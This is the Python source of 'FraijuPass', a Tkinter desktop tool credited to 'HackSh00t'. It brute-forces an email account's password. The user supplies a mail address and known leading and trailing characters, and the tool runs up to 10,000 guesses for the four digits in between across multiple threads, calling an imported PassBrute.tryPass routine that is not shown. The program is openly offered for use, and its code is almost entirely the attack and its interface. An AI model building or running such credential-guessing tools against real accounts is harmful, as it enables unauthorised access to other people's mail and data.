import os
import PassBrute
import time
import threading
from tkinter import *
from tkinter import messagebox
from tkinter import ttk

#globals
_trys=0
_done=False
_paused=False
_quit=False

#Functions
def licenseFunc():
    messagebox.showinfo("License", "This application is an open source product.\n\nHas no Copyright")

def aboutFunc():
    messagebox.showinfo("About", "FraijuPass\nUse it in your own risk\nBy: HackSh00t")

def exitApp():
    exitval=messagebox.askquestion("Exit", "Do you want to exit the application?")

    if exitval=="yes":
        root.destroy()

def PassList(name, startNum):
	global _done
	global _trys
	first=varFirstKey.get()
	second=varLastKey.get()
	mail=varMail.get()
	num=int(startNum)
	passToTry=""

	while num<10000 and _done==False and _trys<10000:
		try:
			if num<10:
				passToTry = first + "000" + str(num) + second
			elif num<100:
				passToTry = first + "00" + str(num) + second
			elif num<1000:
				passToTry = first + "0" + str(num) + second
			else:
				passToTry = first + str(num) + second

			if PassBrute.tryPass(mail, passToTry):
				_done=True
				lblPassword.config(text=passToTry)
				lblTrys.config(text="")
				lblError.config(text="")
				progress["value"] = 0
				break
			else:
				lblTrys.config(text=str(_trys))
				lblError.config(text="")
				progress["value"] = _trys

			if _done:
				lblTrys.config(text="")
				lblError.config(text="")
				progress["value"] = 0

			if _paused:
				while _paused:
					time.sleep(5)
					if _quit:
						break
			
			if _quit:
				break

			num+=1
			_trys+=1
		except:
			lblError.config(text="Connection error...")
			lblTrys.config(text=str(_trys))
			time.sleep(5)
			if _quit:
				break

def getCreds():
	global _done
	global _trys
	
	_done=False
	_trys=0

	lblPassword.config(text="")

	threads=varThreads.get()
	numThread=10000/int(threads)
	startNum=0

	for i in range(threads):
		threadName = "Thread" + str(i)

		if startNum<10000:
			threading._start_new_thread(PassList, (threadName, int(startNum)))
		
		startNum+=numThread
	
	while _done==False:
		root.update()

def setPause():
	global _paused

	if _paused==False:
		_paused=True
		btnPause.config(text="Unpause")
	else:
		_paused=False
		btnPause.config(text="Pause")

def setQuit():
	global _quit

	_quit=True
	
	for i in range(4):
		lblError.config(text="Quitting...")
		root.update()
		time.sleep(2.5)
		lblError.config(text="Whait...")
		root.update()
		time.sleep(2.5)
	
	progress["value"] = 0
	lblTrys.config(text="")
	lblError.config(text="")
	_quit=False

#Main Frame configuration
root=Tk()
root.title("FraijuPass")
root.config(width=400, height=400)
root.resizable(False, False)

mainFrame=Frame(root)
mainFrame.pack()
mainFrame.config(width=400, height=400)

#Vars
varMail=StringVar(root)
varFirstKey=StringVar(root)
varLastKey=StringVar(root)

varThreads=IntVar(root)
varThreads.set(10)

#Menu bar configuration
MenuBar=Menu(root)
root.config(menu=MenuBar)

FileBar=Menu(MenuBar, tearoff=0)
FileBar.add_command(label="Exit", command=exitApp)

HelpBar=Menu(MenuBar, tearoff=0)
HelpBar.add_command(label="License", command=licenseFunc)
HelpBar.add_command(label="About", command=aboutFunc)

MenuBar.add_cascade(label="Files", menu=FileBar)
MenuBar.add_cascade(label="Help", menu=HelpBar)

#Main frame items
baseFolder=os.path.dirname(__file__)
imagePath=os.path.join(baseFolder, "Images/Fraiju.png")
Image=PhotoImage(file=imagePath)
Label(mainFrame, image=Image).grid(row=0, column=0, rowspan=2)

Label(mainFrame, text="Threads: ").grid(row=0, column=1)
txtThreads=Entry(mainFrame)
txtThreads.config(fg="blue", justify="center", textvariable=varThreads)
txtThreads.grid(row=0, column=2, columnspan=2)

Label(mainFrame, text="Mail: ").grid(row=1, column=1)
txtMail=Entry(mainFrame)
txtMail.config(fg="green", justify="center", textvariable=varMail)
txtMail.grid(row=1, column=2, columnspan=2)

Label(mainFrame, text="First Keys: ").grid(row=2, column=0)
txtKeyFirst=Entry(mainFrame)
txtKeyFirst.config(fg="blue", justify="center", textvariable=varFirstKey)
txtKeyFirst.grid(row=2, column=1)

Label(mainFrame, text="Last Keys: ").grid(row=2, column=2)
txtKeyLast=Entry(mainFrame)
txtKeyLast.config(fg="blue", justify="center", textvariable=varLastKey)
txtKeyLast.grid(row=2, column=3)

progress = ttk.Progressbar(mainFrame, orient='horizontal', length=300, mode='determinate')
progress.grid(row=3, column=0, columnspan=3)
progress["maximum"] = 10000
progress["value"] = 0

lblTrys=Label(mainFrame)
lblTrys.config(fg="blue")
lblTrys.grid(row=3, column=3)

Button(mainFrame, text="START", command=getCreds).grid(row=4, column=0, sticky="W")

btnPause = Button(mainFrame)
btnPause.config(text="Pause", command=setPause)
btnPause.grid(row=4, column=1, sticky="W")

Button(mainFrame, text="Quit", command=setQuit).grid(row=4, column=1, sticky="E", padx=30)

lblPassword=Label(mainFrame)
lblPassword.config(fg="green")
lblPassword.grid(row=4, column=2)

lblError=Label(mainFrame)
lblError.config(fg="red")
lblError.grid(row=4, column=3)

root.mainloop()
